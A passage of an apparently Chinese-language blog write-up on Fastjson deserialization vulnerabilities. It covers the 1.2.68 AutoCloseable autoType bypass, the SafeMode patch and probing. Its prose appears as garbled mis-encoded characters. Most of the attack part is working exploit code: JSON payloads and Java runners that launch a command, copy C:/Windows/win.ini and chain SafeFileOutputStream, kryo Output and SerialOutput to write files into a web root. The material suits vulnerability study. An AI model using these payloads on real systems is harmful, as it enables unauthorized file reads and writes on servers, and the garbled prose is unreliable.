æ–¹æ³•æˆ–setteræ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œåˆ™å¯ä»¥è¢«æ”»å‡»åˆ©ç”¨ï¼›</li></ol><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>åˆ©ç”¨ç±»å¿…é¡»æ˜¯expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼›</li></ul><p>è¿™é‡Œå…ˆå±•ç¤ºæ”»å‡»æµç¨‹</p><p>å‡è®¾FastjsonæœåŠ¡ç«¯å­˜åœ¨å¦‚ä¸‹å®ç°AutoCloseableæ¥å£ç±»çš„æ¶æ„ç±»VulAutoCloseableï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-comment">//fastjson1.2.68</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoType_RaoGuo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.clown.vul.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031446394.png" alt="image-20240903144639232"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼€å¯autoTypeSupportä¹Ÿèƒ½å¤ŸæˆåŠŸ</p><p>ç›´æ¥ä»checkAutoTypeå‡½æ•°å¼€å§‹è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202409031453120.png" alt="image-20240903145345998"></p><p>åˆ°è¿™é‡Œå¯ä»¥ç›´æ¥å¯ä»¥ä»ç¼“å­˜ä¸­è·å–åˆ°AutoCloseableè¿™ä¸ªç±»</p><p><img src="https://cdn.clown2024.cn/202409031502045.png" alt="image-20240903150200931"></p><p>ç„¶åå¾€ä¸‹ç›´æ¥returnäº†ï¼Œå› ä¸ºè¿™æ—¶å€™expectClassè¿˜æ˜¯ç©ºçš„</p><p><img src="https://cdn.clown2024.cn/202409031532444.png" alt="image-20240903153245307"></p><p>ç„¶åä¼ è¿›å»AutoCloseableååºåˆ—åŒ–ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202409031542039.png" alt="image-20240903154215912"></p><p>åˆ°è¿™é‡Œè·å–ååºåˆ—åŒ–å™¨ä¸ºç©ºï¼Œç„¶åtypeNameä¸ºæˆ‘ä»¬çš„å®ç°ç±»ï¼ŒexpectClassä¼ é€’çš„æ˜¯AutoCloseableç±»ï¼Œç»§ç»­è·Ÿè¿›checkAutoTypeå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202409031554161.png" alt="image-20240903155427045"></p><p>åˆ°è¿™é‡ŒexpectClassFlagå°±ä¸ºtrueäº†</p><p><img src="https://cdn.clown2024.cn/202409031557163.png" alt="image-20240903155741275"></p><p>æœ€åèµ°åˆ°è¿™ä¸ªåœ°æ–¹ï¼ŒexpectClassFlagä½¿åˆ¤æ–­ä¸ºtrueï¼Œæœ€ç»ˆè¿›è¡ŒloadClass</p><p><img src="https://cdn.clown2024.cn/202409031604442.png" alt="image-20240903160414341"></p><p>ç„¶åå¾€ä¸‹æœ‰å¯¹åŠ è½½çš„ç±»è¿›è¡Œåˆ¤æ–­ï¼Œè¿™äº›éƒ½æ˜¯å¸¸è§çš„jndiåˆ©ç”¨é“¾çš„ç±»ï¼Œå¦‚æœå±äºè¿™äº›ç±»æˆ–è€…å­ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202409031602941.png" alt="image-20240903160225818"></p><p>å¾€ä¸‹è¿˜æœ‰ä¸€ä¸ªåŠ å…¥ç¼“å­˜ï¼Œç„¶åreturnï¼Œè¿™é‡Œè¿˜åˆ¤æ–­äº†æˆ‘ä»¬çš„clazzæ˜¯å¦ä¸ºexpectClassçš„å­ç±»ï¼Œæ‰€ä»¥æ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿expectClass</p><p>ç„¶åå°±æ˜¯ååºåˆ—åŒ–è§¦å‘æ„é€ å‡½æ•°å¼¹è®¡ç®—å™¨</p><blockquote><p>ä¸è¿‡è¿™é‡Œä¸è¿‡getæˆ–è€…setç›´æ¥æ„é€ å‡½æ•°ä¹Ÿå¯ä»¥äº†ï¼Œåœ¨æ—©æœŸç‰ˆæœ¬æˆ‘è¯•äº†ä¸€ä¸‹åªèƒ½é»˜è®¤æ„é€ æ–¹æ³•ï¼Œä¸è¿‡å¦‚æœå­˜åœ¨é»˜è®¤æ„é€ æ–¹æ³•ä¹Ÿæ˜¯ä¼˜å…ˆé»˜è®¤æ„é€ æ–¹æ³•</p></blockquote><h3><span id="å®æˆ˜åˆ©ç”¨">å®æˆ˜åˆ©ç”¨</span></h3><p>å®æˆ˜ä¸­è¦å»æ‰¾å®é™…å¯è¡Œçš„åˆ©ç”¨ç±»ï¼Œä¹Ÿå°±æ˜¯ç»§æ‰¿äº†autoCloaseableç±»çš„ï¼Œä¸»è¦æ˜¯å¯»æ‰¾å…³äºè¾“å…¥è¾“å‡ºæµçš„ç±»æ¥å†™æ–‡ä»¶ï¼ŒIntputStreamå’ŒOutputStreaméƒ½æ˜¯å®ç°è‡ªAutoCloseableæ¥å£çš„ã€‚</p><p>å¯»æ‰¾gadgetçš„æ¡ä»¶å¯ä»¥å‚è€ƒè¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æŒ‡å®šæ–‡ä»¶è·¯å¾„çš„ OutputStream<br>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥å­—èŠ‚æ•°æ®çš„ OutputStreamï¼Œå‚æ•°ç±»å‹å¿…é¡»æ˜¯byte[]ã€ByteBufferã€Stringã€char[]å…¶ä¸­çš„ä¸€ä¸ªï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œæœ€åå¯ä»¥é€šè¿‡ write æ–¹æ³•å°†ä¼ å…¥çš„å­—èŠ‚ç  write åˆ°ä¼ å…¥çš„ OutputStream<br>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è°ƒç”¨ toStringã€hashCodeã€getã€setã€æ„é€ æ–¹æ³• è°ƒç”¨ä¼ å…¥çš„ OutputStream çš„ closeã€write æˆ– flush æ–¹æ³•<br>ä»¥ä¸Šä¸‰ä¸ªç»„åˆåœ¨ä¸€èµ·å°±èƒ½æ„é€ æˆä¸€ä¸ªå†™æ–‡ä»¶çš„åˆ©ç”¨é“¾ï¼Œæˆ‘é€šè¿‡æ‰«æäº†ä¸€ä¸‹ JDK ï¼Œæ‰¾åˆ°äº†ç¬¦åˆç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ¡ä»¶çš„ç±»ã€‚<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€äº›åˆ©ç”¨payload</p><p><strong>å¤åˆ¶æ–‡ä»¶</strong></p><p>åˆ©ç”¨ç±»ï¼š<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>åˆ©ç”¨ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å»çœ‹ä¸€ä¸‹SafeFileOutputStreamçš„æºç ï¼š</p><p><img src="https://cdn.clown2024.cn/202409031659197.png" alt="image-20240903165946075"></p><p>è¯¥æ„é€ å‡½æ•°åˆ¤æ–­å¦‚æœtargetPathæ–‡ä»¶ä¸å­˜åœ¨ä¸”tempPathæ–‡ä»¶å­˜åœ¨ï¼Œå°±ä¼šæŠŠtempPathå¤åˆ¶åˆ°targetPathä¸­</p><p>åˆ©ç”¨PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Move</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;D:/win.txt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031704660.png" alt="image-20240903170451492"></p><p><strong>æ–‡ä»¶å†™å…¥</strong></p><p>å†™å†…å®¹ç±»ï¼š<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Outputç±»ä¸»è¦ç”¨æ¥å†™å†…å®¹ï¼Œå®ƒæä¾›äº†setBuffer()å’ŒsetOutputStream()ä¸¤ä¸ªsetteræ–¹æ³•å¯ä»¥ç”¨æ¥å†™å…¥è¾“å…¥æµï¼Œå…¶ä¸­bufferå‚æ•°å€¼æ˜¯æ–‡ä»¶å†…å®¹ï¼ŒoutputStreamå‚æ•°å€¼å°±æ˜¯å‰é¢çš„SafeFileOutputStreamç±»å¯¹è±¡ï¼Œè€Œè¦è§¦å‘å†™æ–‡ä»¶æ“ä½œåˆ™éœ€è¦è°ƒç”¨å…¶flush()å‡½æ•°</p><p>çœ‹ä¸€ä¸‹Outputç±»çš„æºç </p><p><img src="https://cdn.clown2024.cn/202409031911793.png" alt="image-20240903191151647"></p><p><img src="https://cdn.clown2024.cn/202409031915040.png" alt="image-20240903191539933"></p><p><img src="https://cdn.clown2024.cn/202409031913515.png" alt="image-20240903191344410"></p><p>æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è°ƒç”¨åˆ°Outputçš„flushå‡½æ•°</p><p>flushå‡½æ•°å¯ä»¥åœ¨è°ƒç”¨closeå‡½æ•°å’Œrequireå‡½æ•°æ—¶è§¦å‘</p><p><img src="https://cdn.clown2024.cn/202409032015641.png" alt="image-20240903201552519"></p><p><img src="https://cdn.clown2024.cn/202409032015969.png" alt="image-20240903201535860"></p><p>ç„¶årequireå‡½æ•°åœ¨writeç›¸å…³å‡½æ•°è§¦å‘</p><p><img src="https://cdn.clown2024.cn/202409032016029.png" alt="image-20240903201620928"></p><p><img src="https://cdn.clown2024.cn/202409032017695.png" alt="image-20240903201703586"></p><p>ç„¶åæ‰¾åˆ°JDKçš„ObjectOutputStreamç±»ï¼Œå…¶å†…éƒ¨ç±»BlockDataOutputStreamçš„æ„é€ å‡½æ•°ä¸­å°†OutputStreamç±»å‹å‚æ•°èµ‹å€¼ç»™outæˆå‘˜å˜é‡ï¼Œè€Œå…¶setBlockDataMode()å‡½æ•°ä¸­è°ƒç”¨äº†drain()å‡½æ•°ã€drain()å‡½æ•°ä¸­åˆè°ƒç”¨äº†out.write()å‡½æ•°ï¼Œæ»¡è¶³å‰é¢çš„éœ€æ±‚</p><blockquote><p>è¿™éƒ½å’‹æ‰¾çš„å•ŠğŸ˜¢</p></blockquote><p><img src="https://cdn.clown2024.cn/202409032020430.png" alt="image-20240903202010304"></p><p><img src="https://cdn.clown2024.cn/202409032020708.png" alt="image-20240903202044589"></p><p>ç„¶åå¯¹äºsetBlockDataMode()å‡½æ•°çš„è°ƒç”¨ï¼Œåœ¨ObjectOutputStreamç±»çš„æœ‰å‚æ„é€ å‡½æ•°ä¸­å°±å­˜åœ¨</p><p><img src="https://cdn.clown2024.cn/202409032023421.png" alt="image-20240903202324306"></p><p>ä½†æ˜¯Fastjsonä¼˜å…ˆè·å–çš„æ˜¯ObjectOutputStreamç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œå› æ­¤åªèƒ½æ‰¾ObjectOutputStreamçš„ç»§æ‰¿ç±»æ¥è§¦å‘ï¼Œç„¶åæ‰¾åˆ°åªæœ‰æœ‰å‚æ„é€ å‡½æ•°çš„ObjectOutputStreamç»§æ‰¿ç±»ï¼š<strong>com.sleepycat.bind.serial.SerialOutput</strong>ï¼Œè¿™ä¸ªç±»åœ¨è¿™ä¸ªä¾èµ–é‡Œé¢</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032027918.png" alt="image-20240903202720784"></p><p>ç„¶åè¿™é‡Œè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œåˆ°è¿™é‡Œæœ€ç»ˆæ»¡è¶³æ¡ä»¶</p><p>pocå¦‚ä¸‹ï¼Œç„¶åä¹Ÿè¿ç”¨äº†å‰é¢çš„å¾ªç¯å¼•ç”¨æŠ€å·§</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å†™å…¥æ–‡ä»¶æœ‰é™ï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦å†™ä¸äº†ï¼Œæ¯”å¦‚phpä»£ç </p><blockquote><p>payloadç›´æ¥æŠ„äº†ï¼Œæ€ä¹ˆå†™å‡ºæ¥çš„å°±ä¸ç®¡äº†ï¼ˆ</p></blockquote><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Write</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;targetPath\&quot;: \&quot;D:/hacked.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;tempPath\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032034460.png" alt="image-20240903203402350"></p><p>buffè¿™é‡Œä¼ çš„æ˜¯base64ä¹‹åçš„æ•°æ®</p><p><strong>è¡¥ä¸åˆ†æ</strong></p><p>é¢é¢é¢è¯¥ç‰ˆæœ¬ä¹‹åçš„è¡¥ä¸åˆæ˜¯ç²—æš´çš„ç»™expectClasså¤šåŠ ä¸Šä¸€äº›é»‘åå•</p><h2><span id="safemode">SafeMode</span></h2><p>åœ¨1.2.68ä¹‹åçš„ç‰ˆæœ¬ï¼Œåœ¨1.2.68ç‰ˆæœ¬ä¸­ï¼Œfastjsonå¢åŠ äº†safeModeçš„æ”¯æŒã€‚safeModeæ‰“å¼€åï¼Œå®Œå…¨ç¦ç”¨autoTypeã€‚</p><p>å¼€å¯å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>å¼€å¯ä¹‹åç›´æ¥å®Œå…¨ç¦ç”¨autoTypeï¼Œå³@type</p><p><img src="https://cdn.clown2024.cn/202409032040917.png" alt="image-20240903204034792"></p><p>è·å–æ˜¯å¦è®¾ç½®äº†SafeModeï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢è¿è¡Œ</p><h1><span id="fastjson1280">Fastjson1.2.80</span></h1><p>1.2.68ä¹‹åæ–°ç‰ˆæœ¬å°†<code>java.lang.Runnableã€java.lang.Readableå’Œjava.lang.AutoCloseable</code>åŠ å…¥äº†é»‘åå•ï¼Œè¿™é‡Œå°±åˆ©ç”¨å¦ä¸€ä¸ªæœŸæœ›ç±»ï¼Œå¼‚å¸¸ç±»<code>Throwable</code></p><p>è¿™é‡Œå°±çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å°±è¡Œäº†ï¼š<a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%BE%88%E9%9A%BE%E6%9C%89rce%E7%9A%84%E7%82%B9%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E6%87%92%E4%BA%86%E4%B8%8D%E6%83%B3%E5%86%8D%E5%86%99%E4%BA%86%F0%9F%98%A2">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQï¼Œå› ä¸ºçœ‹èµ·æ¥å¾ˆéš¾æœ‰rceçš„ç‚¹ï¼ˆä¸»è¦æ˜¯æ‡’äº†ä¸æƒ³å†å†™äº†ğŸ˜¢</a></p><h1><span id="ä¿¡æ¯æ¢æµ‹">ä¿¡æ¯æ¢æµ‹</span></h1><p>å¹³æ—¶ç”¨äºæ¢æµ‹fastjsonçš„ä¸€äº›ä¿¡æ¯æ¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://forum.butian.net/share/2858%EF%BC%8Chttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://forum.butian.net/share/2858ï¼Œhttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p>ç„¶åä½¿ç”¨safe6Secå¸ˆå‚…çš„å¤ç°ç¯å¢ƒæ¥åšæµ‹è¯•ï¼š<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p><p>å°†å…¶ä¸­&#x2F;jsonè·¯ç”±çš„ä»£ç ä¿®æ”¹ä¸€ä¸‹æ–¹ä¾¿æŸ¥çœ‹è§£æç»“æœæˆ–è€…è§£ææŠ¥é”™ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢ç›´æ¥å‘&#x2F;jsonè·¯ç”±è¿›è¡Œpostè¯·æ±‚å³å¯</p><h2><span 